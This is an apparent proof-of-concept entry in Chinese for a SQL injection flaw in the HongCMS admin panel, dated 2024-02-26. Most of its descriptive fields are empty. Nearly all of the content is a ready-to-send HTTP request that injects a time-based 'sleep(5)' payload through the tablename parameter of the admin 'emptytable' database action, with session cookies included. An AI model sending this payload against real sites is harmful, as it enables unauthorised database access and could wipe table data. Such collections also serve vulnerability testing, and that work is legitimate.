﻿# HongCMS 后台注入漏洞

> 更新时间：2024-02-26

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /admin/index.php/database/operate?dbaction=emptytable&tablename=hong_acat`+where+cat_id=2+and+sleep(5);%23 HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=mond1i21lhdga3uu95dl55t9756; history=%5B%7B%22name%22%3A%22bbbbbbbbbbbbb%22%2C%22pic%22%3A%22%2Fa%22%2C%22link%22%3A%22%2Fdetail%2F%3F3.html%22%2C%22part%22%3A%22%E7%AC%AC1%E9%9B%86%22%7D%5D; G83uI01naUG3safe=44e720c8d1e94fc28e9827da10cc85ae; 44e720c8d1e94fc28e9827da10cc85ae=79a6095ed8d78b560b2fe814991f1ftfe; G83uI01naUG3admin=5e7a4183c9672399dedfab3436859c0e; G83uI01naUG3backinfos=0*0*0*0*0*0*0
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：HongCMS 后台注入漏洞.poc